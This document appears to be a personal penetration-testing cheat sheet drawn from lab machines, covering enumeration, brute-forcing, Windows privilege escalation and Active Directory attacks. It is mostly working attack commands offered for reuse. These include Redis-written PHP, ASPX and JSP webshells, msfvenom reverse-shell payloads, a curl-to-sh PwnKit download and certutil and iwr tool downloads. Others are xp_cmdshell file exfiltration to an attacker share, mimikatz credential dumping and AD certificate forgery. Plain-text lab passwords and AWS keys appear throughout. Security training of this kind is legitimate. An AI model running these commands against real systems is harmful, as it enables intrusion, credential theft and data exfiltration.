# 1. Enumeration

## Metadata

### exiftool

```bash
exiftool file
```

## Local Enumeration Scripts

### Grabbing usernames

```bash
grep sh$ /etc/passwd
```

### Finding SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -user root -type f -perm -4000 -ls 2>/dev/null
```

## Cloud / AWS

### AWS â†’ secret â†’ s3

```
aws configure

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/vpn]
â””â”€$ aws configure
AWS Access Key ID [****************c7em]: AKIAA042540D4E8C3E8E
AWS Secret Access Key [****************3E8E]: Zf5bIMiltmLF2ux1JZyX3Gs3MasRtlwcAolHc7em
Default region name [us-east-1]:
Default output format [json]:

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/vpn]
â””â”€$ aws --endpoint-url <http://facts.htb:54321> s3 ls
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/vpn]
â””â”€$
```

## Redis

[https://hackviser.com/tactics/pentesting/services/redis](https://hackviser.com/tactics/pentesting/services/redis)

### metasploit

```jsx
use auxiliary/scanner/redis/redis_server
```

### Connecting

```jsx
redis-cli -h target.com
```

### Spawning webshell

```jsx
 Method 1: PHP webshell
redis-cli -h target.com
> flushall
> set shell '<?php system($_REQUEST["cmd"]); ?>'
> config set dbfilename shell.php
> config set dir /var/www/html
> save

# Access: http://target.com/shell.php?cmd=whoami

# Method 2: ASP.NET webshell
> set shell '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Process.Start(Request["cmd"]);%>'
> config set dbfilename shell.aspx
> config set dir C:\\inetpub\\wwwroot
> save

# Method 3: JSP webshell
> set shell '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
> config set dbfilename shell.jsp
> config set dir /var/www/html
> save
```

### Redis RCE

```jsx
RCE:https://github.com/Ridter/redis-rce
```

```jsx
https://github.com/gysf666/RedisModules-ExecuteCommand
```

```jsx
python redis-rce.py -r 192.168.220.176 -L 192.168.45.198 -P 6666 -p 6379 -f exp.so

```

## SSH

usually located in the home directory of the user 

```jsx
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

### Using a key

```
nano id_rsa
paste the key
chmod 600 id_rsa
ssh -i id_rsa username@target_ip
ssh -i root root@127.0.0.1 -o IdentitiesOnly=yes

```

### Cracking a key

```
â””â”€$ ssh2john id_ed25519
id_ed25519:$sshng$6$16$e641fd491743bdd48d8633fcb477d0cc$290$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010e641fd491743bdd48d8633fcb477d0cc0000001800000001000000330000000b7373682d65643235353139000000208016016aec442bd77315593f7e6b505d37fc52deed8f639302ab1985ad979866000000a0c64764ca8c76078c20a7c69b61eb4867f6d9e504f8aed73d6c6f476b7be93963a69947e0ad5e9eb1b7c0b13b1381635437e295c403584e107441db92d98bae664ac3e2eb57a8166147866593d2439f1c7a4f95b63bfca9f6f028f35e7dad040ba9eec3e8831dd9024f30b59db48861f8f1b3e08345d20489ae095b73baef4c1eba4203dd2b1c92c14c034e0478268654d884349fc0fa875de00f5ea7840a5953$24$130

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/Boxes/Facts]
â””â”€$ ssh2john id_ed25519 > hash.txt

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/Boxes/Facts]
â””â”€$ cat hash.txt
id_ed25519:$sshng$6$16$e641fd491743bdd48d8633fcb477d0cc$290$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010e641fd491743bdd48d8633fcb477d0cc0000001800000001000000330000000b7373682d65643235353139000000208016016aec442bd77315593f7e6b505d37fc52deed8f639302ab1985ad979866000000a0c64764ca8c76078c20a7c69b61eb4867f6d9e504f8aed73d6c6f476b7be93963a69947e0ad5e9eb1b7c0b13b1381635437e295c403584e107441db92d98bae664ac3e2eb57a8166147866593d2439f1c7a4f95b63bfca9f6f028f35e7dad040ba9eec3e8831dd9024f30b59db48861f8f1b3e08345d20489ae095b73baef4c1eba4203dd2b1c92c14c034e0478268654d884349fc0fa875de00f5ea7840a5953$24$130
```

### Old SSH Algorithms

```bash
ssh -oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa root@beep.htb
```

## Nmap

### Going through nmap scripts

```bash
ls -al /usr/share/nmap/scripts/ | grep ftp-
```

### Top UDP

```bash
nmap 10.129.18.188 -sU -top-ports=100 --min-rate=20000
```

### Useful Switches

- `sn` â†’ Ping sweep
- `sS` â†’ TCP SYN
- `Pn` â†’ Disable host discovery
- `p-` â†’ All ports
- `sV` â†’ Version detection
- `A` â†’ OS detect + scripts + traceroute
- `O` â†’ OS detection
- `T4` â†’ Faster scan
- `sC` â†’ Default scripts

### Port Knocking

```bash
for i in 571 290 911; do
nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.10.43 >/dev/null
done
ssh -i ~/keys/id_rsa_nineveh_amrois amrois@10.10.10.43
```

### Filtered Ports

```bash
nmap -p- --min-rate 10000 <ip>
```

## Web Enumeration

### Gobuster

```bash
gobuster dir -u <http://10.129.229.27/> -w /home/kali/Desktop/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -k if https

also try
--wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt

API enumeration

make a file like this

{GOBUSTER}/v1
{GOBUSTER}/v2

name it pattern and then 

kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

and then u can follow

gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

### Dirb

```bash
dirb <http://192.168.1.224/> /usr/share/wordlists/dirb/common.txt
```

### Feroxbuster

```
feroxbuster -u <http://10.10.11.220> -x php
feroxbuster -u <http://10.10.11.220/js> -x js
feroxbuster -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

**Iâ€™ll use feroxbuster to brute force the API. Iâ€™ll use the -m GET,POST option to try both GET and POST requests, and -k to accept the invalid TLS certificate. Iâ€™m starting at /nagiosxi/api, and it finds v1 quickly (as well as includes):**
```

### Sublist3r

```bash
sublist3r -d website -e google,yahoo
```

### Wfuzz

```
wfuzz -u <http://10.129.18.188> -H "Host: FUZZ.pandora.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 1131
wfuzz -u http://<IP> -H "Host: FUZZ.domain.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

Parameter fuzzing

wfuzz -u <https://streamio.htb/admin/?FUZZ=> -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=jtde06u71uq4t7pvs59b8iis1o" --hh 1678
```

### Php filter

```
<https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php:>
echo "PGgxPDQo/Pg==" | base64 -d > master.php
```

### Ffuf

### Username Enumeration

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```

### Subdomain Enum

```bash
ffuf -u <http://builder.htb/> -H "Host: FUZZ.trackbox.scipiosoft.com" -w /home/kali/Desktop/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
ffuf -u "<http://builder.htb:8080>" -H "Host: FUZZ.builder.htb:8080" -w /home/kali/Desktop/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
```

### Bruteforcing

```bash
ffuf -w valid_usernames.txt:W1 -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200

ffuf -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u <http://10.129.95.192/> -fc 200

ffuf -w users.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <http://10.129.1.27/login.php> -fc 200
```

### Dirbusting

```bash
ffuf -u <http://editorial.htb/FUZZ> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt,.bak,.old,.zip -fc 404 -k
```

## Service Enumeration

### SMB

```
smbclient -L \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\192.91.46.3\\\\\\\\\\\\\\\\ -U admin
to access share remove -L
smbclient \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\192.91.46.3\\\\\\\\\\\\\\\\public -U admin

justuse this
**smbclient //10.129.95.154/IT -U intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876
impacket-smbclient Tiffany.Molina:NewIntelligenceCorpUser9876@10.129.95.154**

crackmapexec smb support.htb --shares -M spider_plus -o DOWNLOAD_FLAG=True
netexec smb $target -u 'guest' -p '' --shares --spider HR --regex
grep -ri 'user' /root/.nxc/... or pass
gpp=decrypt

nmblookup -A [ip]
smbmap -H [ip/hostname]
nmap --script smb-enum-shares -p 139,445 [ip]

smbclient -N "//$target/Replication"
```

### CrackMapExec

```
crackmapexec smb support.htb
crackmapexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
crackmapexec winrm 10.129.6.151 -u support -p 'Ironside47pleasure40Watchful' --> checks if winrm is allowed
```

### OpenSSL

```bash
openssl s_client -connect sequel.htb:3269
```

### OpenSSL - Extracting the loot

```
oxdf@hacky$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc

 openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key

 openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt

 ls legacyy_dev_auth.*

 $ evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```

### MSSQL

```
python mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@target -windows-auth or without windows auth

EXEC xp_dirtree '\\\\\\\\10.10.14.137\\\\share',1,1

activating xpcmdshell
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell whoami

transferring file

sudo impacket-smbserver share . -smb2support

enable_xp_cmdshell

xp_cmdshell "copy C:\\\\inetpub\\\\wwwroot\\\\website-backup-27-07-23-old.zip \\\\\\\\<YOUR_KALI_IP>\\\\share\\\\backup.zip"

or

xp_cmdshell "cd C:\\\\inetpub\\\\wwwroot && powershell -c python -m http.server 8000"
```

Switching Users

```jsx
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name             
--------------   
hrappdb-reader

SQL (HAERO\discovery  guest@master)> EXECUTE AS LOGIN = 'hrappdb-reader'
SQL (hrappdb-reader  guest@master)> use hrappdb
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: hrappdb
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'hrappdb'.

SQL (hrappdb-reader  hrappdb-reader@hrappdb)> SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
hrappdb         dbo            sysauth      b'BASE TABLE'   
```

## Postgres

```jsx
psql -h 192.168.143.47 -p 5437 -U postgres
```

### MYSQL

```
mysql -h 127.0.0.1 -P 3306 -u tiffany -p'BackDropJ2024DS2024'
instead of terminatpr ;  use \G

updating password
UPDATE planning_user SET password='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' WHERE user_id='ADM';
```

### SNMP

```
snmp-check 10.10.10.10
snmpwalk -v2c -c public 10.129.230.96 -m all
 One thing to always check out is the running processes and their
command lines. Process 1312 in my collection (will be different in
others) is a sudo process:f

snmpbulkwalk -v2c -c public ipaddr -m all | tee snmp.out
grep SWRun snmp.out } grep 1222
```

## SMTP

Verifying usernames

```jsx
smtp-user-enum -M VRFY -U users.txt -t 192.169.139.140
```

### RPC-client

```
rpcclient -U "" -N 10.10.10.172
querydispinfo
```

### GitDump

```
python3 -m venv venv
source venv/bin/activate
pip install PySocks,urllib3,dulwich,requests,bs4,requests-pkcs12
python git_dumper.py <http://siteisup.htb/dev/.git/> dumped_git

git log
git status
git diff --cached Dockerfile.ghost

grep -R "@dog.htb" *

Inspect specific commits/files:

    git checkout <commit-id>: Switches your working directory to a specific commit ID to examine the state of files at that point in time.
    git show <commit-id>: Displays the changes introduced by a specific commit, including file contents and metadata.
    git diff <commit-id-1> <commit-id-2>: Shows the differences between two specific commits.
    Look for sensitive information within files:

    grep -r "password" .: Use grep to search the repository files for keywords like "password", "API_key", "credentials", etc.
```

### LDAP & ldapdomaindump

```
ldapsearch -x -H ldap://10.129.230.96 -b "dc=monitored,dc=htb"
ldapsearch -H ldap://nagios.monitored.htb -x -s base namingcontexts
ldapsearch -x -H ldap://10.129.230.96 -b "dc=monitored,dc=htb" "(objectClass=user)"
ldapsearch -x -H ldap://10.129.230.96 -b "dc=monitored,dc=htb" "(objectClass=person)"

nxc ldap 10.129.95.154 \\\\
-u Tiffany.Molina \\\\
-p 'NewIntelligenceCorpUser9876' \\\\
--query "(objectClass=dnsNode)" "CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"

ldapsearch -x -H ldap://10.129.95.154 \\\\
-D "Tiffany.Molina@intelligence.htb" \\\\
-w 'NewIntelligenceCorpUser9876' \\\\
-b "CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"

ldapdomaindump -u management.htb\\\\\\\\operator -p 'operator' 10.10.11.236 -o ldap/
check
domain_users_by_group.html
```

## http-proxy enumeration

```jsx
#To scan itself on port 443
curl -i --proxy <http://192.168.113.189:3128> <http://192.168.113.189:443>#To scan itself on port 8000
curl -i --proxy <http://192.168.113.189:3128> <http://192.168.113.189:8000>

80 - HTTP (default)
443 - HTTPS (default secure)
8080 - Common alternative HTTP port (you found this!)
8000 - Alternative web server
8888 - Alternative web server
3000 - Node.js/React development servers
5000 - Flask/Python development servers
8443 - Alternative HTTPSAdmin/Management Interfaces:9090 - Cockpit, other admin panels
10000 - Webmin
8181 - GlassFish adminWindows Specific:5985 - WinRM HTTP
5986 - WinRM HTTPS

gobuster dir -u http://192.168.139.189:8080 -w /usr/share/wordlists/dirb/common.txt --proxy http://192.168.139.189:3128
```

# 2. Credential Attacks

## NXC

```
nxc ssh 10.10.11.58 -u users.txt -p 'BackDrop'
```

## WPSCAN

```
wpsacn --url <http://internal.thm/wordpress> -U userlist.txt --passwords /usr/share/wordlists/rockyou.txt

wordpress rev shell 404 TwentySeveneteen
Theme editor
```

## Burp

```
After sending to intruder, add your payload positions

Choose Cluserbomb attack

load rockyou
```

## Hydra

### SSH

```
hydra -L users.txt  -P passwords.txt 192.168.122.122 ssh -t4 -vV
hydra -l jennifer -P /usr/share/wordlists/rockyou.txt builder.htb ssh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://servmon.htb -t 4 -vV
```

### PHPMyAdmin Example

```bash
hydra 10.10.10.43 -l 0xdf -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```

### Rails Example

```bash
hydra -l admin -P passwords.txt facts.htb http-post-form "/admin/login:authenticity_token=TOKEN&user[username]=^USER^&user[password]=^PASS^:F=Invalid"
```

### Redirect Example

```bash
hydra -l admin -P rockyou.txt facts.htb http-post-form "/admin/login:authenticity_token=TOKEN&user[username]=^USER^&user[password]=^PASS^:S=/admin"
```

### FTP

```bash
hydra -L users.txt -P passwords.txt 192.x.x.x ftp
wget -r ftp://Anonymous:pass@$IP
cat *

```

### Normal Login Form

```
hydra -l info -P /usr/share/wordlists/rockyou.txt cozyhosting.htb http-post-form "/login:username=^USER^&password=^PASS^:F=error"

"path:POSTDATA:FAILURE_STRING" --> format

hydra -l jennifer -P /usr/share/wordlists/rockyou.txt builder.htb -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=:F=Location\\\\: /loginError"

**body failure string**
hydra -l jennifer -P /usr/share/wordlists/rockyou.txt builder.htb -s 8080 \\\\
http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=:F=Username or Password incorrect"

if success cond
hydra -l jennifer -P /usr/share/wordlists/rockyou.txt builder.htb -s 8080 \\\\
http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=:S=Location\\\\: /"

just match the substring in the response body form as the above dont work due to parsing the :

hydra -l jennifer -P /usr/share/wordlists/rockyou.txt builder.htb -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=:F=loginError"

hydra -l dogBackDropSystem -P /usr/share/wordlists/rockyou.txt doghtb -s 80 http-post-form "/?q=user/login:name=^USER^&pass=^PASS^&form_build_id=form-qK3HdRXEJYejDODP5Q3MlHmOGr9o8x3B0ScS0suDm68&form_id=user_login&op=Log+in:F=Sorry, incorrect password""

hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -p BackDropJ2024DS2024 dog.htb \\\\
http-post-form "/?q=user/login:name=^USER^&pass=^PASS^&form_build_id=form-qK3HdRXEJYejDODP5Q3MlHmOGr9o8x3B0ScS0suDm68&form_id=user_login&op=Log+in:F=Sorry, incorrect password"

hydra -l admin@linkvortex.htb -P /usr/share/wordlists/rockyou.txt linkvortex.htb \\\\
http-post-form "/ghost/api/admin/session:{\\\\"username\\\\":\\\\"^USER^\\\\",\\\\"password\\\\":\\\\"^PASS^\\\\"}:F=Invalid"

hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
```

## FFUF

```
 ffuf -u <http://linkvortex.htb/ghost/api/admin/session> -X POST -H "Content-Type: application/json" -H "X-Ghost-Version: 5.58" -H "Origin: <http://linkvortex.htb>" -H "Referer: <http://linkvortex.htb/ghost/>" -d "{"username":"admin@linkvortex.htb","password":FUZZ}" -w /usr/share/wordlists/rockyou.txt -fr "Your password is incorrect"
```

```
ffuf -u "<http://$target/Account/login.aspx?Return>" -w /usr/share/wordlists/rockyou.txt -d '_VIEWSTATE=adfkajfkpajwfipjapfjawLgoinUSERPassword=FUZZ' -X POST -t 20 -H "Content-Type: application/x-www-form-urlencoded" -r -fs 4466

ffuf -request request.txt -w /path/to/wordlist.txt

ffuf -request request.txt -w users.txt:FUZZUSR -w passwords.txt:FUZZPW

**Wrogn password stats**
curl -s -X POST http://192.168.126.29/login.php \
  -d "user=admin" \
  -d "pass=thiswillneverwork123456789" \
  -d "submit=Login" | wc -c
  
  
**Then

â””â”€$ ffuf -u http://192.168.126.29/login.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "user=admin&pass=FUZZ&submit=Login" \
  -w /usr/share/wordlists/rockyou.txt \
  -fs 276 \  -t 6 \                                                  
  -mc 200,302**    
```

## Medusa

```jsx
medusa -h 192.168.126.29 -u admin -P /usr/share/wordlists/rockyou.txt \
  -M http \
  -m FORM:/login.php \
  -m FORM-DATA:"ser=admin&pass=^PASS^&submit=Login" \
  -m DENY-SIGNAL:"Password incorrect." \
  -T 4
```

## CrackMapExec

```bash
crackmapexec winrm -u administrator -p tinkerbell -x "whoami"

credspray
netexec smb $target -u 'userlist2.txt' -p 'creds.txt' --continue-on-success
```

## John

```
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
specify --form=NT when cracking NT hashes
```

## Hashcat

```
hashcat -m 5600 hash.txt rockyou.txt
hashcat -m 0 hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
If you dont mention the mode then it goes in autodetect
-m 7900 for msql drupal hashes
```

# 3. Exploitation

## Windows PrivEsc Helpers

### Certutil

```
certutil -urlcache -split -f "<http://example.com/file.exe>" [LocalPath]
iwr http://192.168.45.159/winPEASany.exe -outfile winPEASany.exeb 

```

### PrintSpoofer - Standard Windows 2019

```
PrintSpoofer32.exe -i -c cmd.exe or powershell.exe

Import-Module .\\\\\\\\Invoke-TokenManipulation.ps1
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ImpersonateUser "NT AUTHORITY\\\\\\\\SYSTEM"
```

### WinExploitSuggester

```bash
python3 wes.py -u
python3 wes.py sysinfo
```

### Mimikatz

```
Invoke-WebRequest <http://10.10.14.28:8081/mimikatz.exe> -OutFile C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\mimikatz.exe
must have SeDebug

use Get-LocalUser to check if user availble locally first
Get-LocalGroup

privilege::debug
token::elevate

lsadump::sam
sekurlsa::logonpasswords
```

### PowerUp.ps1

```
wget PowerUp.ps1 -o PowerUp.ps1
. .\\\\PowerUp.ps1; Invoke-AllChecks

AlwaysInstallElevated
we can create a malicious msi payload and trigger it for an elevated sesion as it allows to run files with a high privileged user account

msfvenom =p windows/x64/shell_reverse_tcp LHOST=10.13.31.108 LPORT=443 -f msi -o reverse,msi

now lets prep the listener and run the executable

msiexec /quiet /qn /i \\\\\\\\TSCLIENT\\\\share\\\\reverse.msi
or
msiexec /quiet /qn /i reverse.msi
wget -useb 10.0.2.11/reverse.msi -o reverse.msi

Invoke-AllChecks
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\\\\studentx' -Verbose
```

### UAC Bypass

```
if we are part of the administrator group but have mandatory lervel medium
Check if autoelevate is linked to this particular executable

powershell -C Get-Content -Path C:\\\\Windows\\\\System32\\\\fodhelper.exe | findstr /I "autoElevate"

or

powershell -C Get-Content -Path C:\\\\Windows\\\\System32\\\\eventvwr.exe | findstr /I "autoElevate"
```

### PrintNightmare

```
 Try this maybe it works sometimes

wget -usebasicparsing 10.10.14.58/CVE-2021-1675.ps1 -o CVE-2021-1675.ps1
. .\\\\CVE-2021-1675.ps1;Invoke-Nightmare
net user
netexec smb $target -u 'admin' -p 'Password' --ntds
impacket-psexec egostical-bank.local/administrator@target -hashes :8345adawdac
```

### Add User to Local Admin

```
net localgroup "administrators" adiaz /add
```

## Payloads / Generators

### pwnkit

```jsx
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

### msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > shell.asp
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > destpath
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.54 LPORT=8220 -f exe -o revshell.exe
```

### SQLMAP

```
sqlmap -r req.txt --batch --level 3 --risk 2

. List all databases
bash
Copy

sqlmap -u "<http://cctv.htb/view?request=event&action=removetag&tid=1>" --dbs

2. List tables in a specific database
bash
Copy

sqlmap -u "<http://cctv.htb/view?request=event&action=removetag&tid=1>" -D <database_name> --tables

3. Dump all data from a specific database
bash
Copy

sqlmap -u "<http://cctv.htb/view?request=event&action=removetag&tid=1>" -D <database_name> --dump

4. Dump specific table
bash
Copy

sqlmap -u "<http://cctv.htb/view?request=event&action=removetag&tid=1>" -D <database_name> -T <table_name> --dumpsqlmap -u "<http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1>" \\\\
--cookie="ZMSESSID=6lkqf49jhdfdo1l4nplp9m9o5" \\\\
-D zm -T Users -C Username,Password \\\\
--where="Username='mark'" \\\\
--dump --threads 10 --batch
```

### Filter Bypass Techniques

```
For white spaces we can use
brace expansion :- {ping,-c,10.10.10.10};
or
env variable, ${IFS} :- ping${IFS}-c${IFS}1
```

# 4. Active Directory

## PowerView

```jsx
. .\Powerview.ps1
```

| **Enumeration** | $env:username$env:computername | gets the comp name nd username |
| --- | --- | --- |
| **Domain Enumeration** | Get-NetComputer | ForEach-Object {$ip = Resolve-DNSName $*.name -ErrorAction SilentlyContinue | Select-Object -ExpandProperty IPAddressWrite-Output "$($*.name) - $ip - $($_.operatingSystem)"} | gets the ip address nd  comp name fr ur AD |
| **Domain Enumeration** | Get-DomainUser -Identity (whoami) | Current domain user |
| **Domain Enumeration** | Get-DomainUser | Displays domain user info |
| **Domain User Enumeration** | Get-DomainUser | select -ExpandProperty samaccountname | Displays only the samaccountname of the users |
| **Domain User Enumeration** | Get-DomainComputer | select -ExpandProperty dnshostname | Gets the dns hostnames of the computers in the domain |
| **Domain User Enumeration** | Get-DomainGroup -Identity "Domain Admins" | Gets us the Domain Admins Groups details |
| **Domain User Enumeration** | Get-DomainGroupMember -Identity "Domain Adminsâ€ | Gets us the members of the Domain Admin Group |
| **Domain User Enumeration** | Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local | Lists out the Enterprise admins, root domain is specified in the query |

## DNS / GMSA

### Adding A DNS Record

```
dnstool.py -u 'intelligence\\\\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.129.95.154 -a add -r web1 -d 10.10.14.137 -t
```

### GMSA DUMP

```
python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l
10.10.10.248
```

## BloodHound

### BloodHound Setup

```
sudo apt install -y neo4j
sudo apt install -y openjdk-17-jdk
sudo apt install -y bloodhound
sudo /usr/share/neo4j/bin/neo4j-admin set-initial-password bloodhound
```

### Collection with bloodyad

```jsx
bloodyAD -d secura.yzx -u Eric.Wallows -p 'EricLikesRunning800' --host dc01.secura.yzx --dc-ip 192.168.122.97 --dns 192.168.122.97
```

A good mental model:

- `d` â†’ **AD domain**
- `-host` â†’ **the DC you want to talk to**
- `-dc-ip` â†’ **DC IP if hostname resolution is flaky**
- `-dns` â†’ **DNS server to resolve AD names**

### Collection

```
nxc ldap 192.168.122.97 -u Eric.Wallows -p 'EricLikesRunning800' -d secura.yzx --dns-server 192.168.122.97 --bloodhound --collection All
bloodhound-python -u user -p pass -d domain -ns DC_IP -c All
bloodhound-python --dns-tcp -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174

python3 /usr/bin/bloodhound-python --dns-tcp -ns 10.129.6.151 -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -c all --zip

Swtich from java 21 to java 17
sudo update-alternatives --config java

viewing it
sudo neo4j start
**neo4j:neo4j**

**OR collect w python and upload on the one i have in windows

go TOOLS and use bloodhound from there after starting neo4j

./bin/neo4j start
./BloodHound --disable-gpu --no-sandbox**

wget <https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound.exe>
upload SharpHound.exe
.\\\\SharpHound.exe -c All
download <generated_zip_name>
```

### DOCKER

```jsx
sudo apt update
sudo apt install -y docker.io docker-compose
sudo systemctl enable --now docker
sudo usermod -aG docker $USER
newgrp docker

curl -L https://ghst.ly/getbhce | BLOODHOUND_PORT=8888 docker compose -f - up
visit http://localhost:8888
username admin and temp password**
 
**# Stop everything**
docker stop $(docker ps -aq)
docker rm $(docker ps -aq)

**# Remove ALL related volumes (critical step)**
docker volume rm $(docker volume ls -q | grep -E "(medtech|bloodhound|neo4j|postgres)") 2>/dev/null || true
docker volume prune -f

**# Also remove any local data directories if they exist**
sudo rm -rf ./medtech-data 2>/dev/null || true
****
docker compose down -v

OR use netexec

netexec ldap $target -u 'judith.mader' p judith09 --bloodhound --collection All --dns-server $target
```

**Update this password everytime u run just incase**

```jsx
rMoKGf3jGTQEzVMzsNdPoehQHWuF635Q
```

## Sharphound if needed

```jsx
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

or with exe

.\SharpHound.exe -c All --Domain secura.yzx --DomainController 192.168.122.97
```

## Rubeus

```bash
Rubeus.exe asktgt /user:administrator /certificate:C:\\\\\\\\programdata\\\\\\\\cert.pfx
```

## Certify / Certipy-ad

```
netexec ldap <DC_IP> -u user -p 'password' -M adcs
```

[http://github.com/ly4k/Certipy/wiki/06â€”-Privilege-Escalation](http://github.com/ly4k/Certipy/wiki/06%E2%80%94-Privilege-Escalation)

```bash
powershell -ep bypass -c ". .\\\\\\\\Certify.ps1; Invoke-Certify"

use -hashes to pass hash

certipy-ad find -u test@test.local -p 'test' -dc-ip target -vulnerable -stdout
certipy-ad find -u test@test.local -p 'test' -dc-ip target -text -output certs
```

Lets check for vulnerable templates

```
certipy-ad find -u test@test.local -p 'test' -dc-ip target -vulnerable -stdout

certipy-ad find -u test@test.local -p 'test' -dc-ip target -text -output certs
cat -n certs_Certipy.txt | grep -iC4 'enrollment rights' | grep -viE "Enterprise Admins|Domain Admins|Domain Controllers" | fgrep -i '\\\\'
```

Forge Certificate

```
certipy req -u 'test@test.local' -p 'test' -dc-ip '10.0.0.100' -target 'CA.TEST.LOCAL' -ca 'TEST-CA' -template 'UserTemplate' -upn -Administrator@corp.local'
```

Get Hash for specific user

```
certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.10.10'
```

get shell with psexec next

## Responder

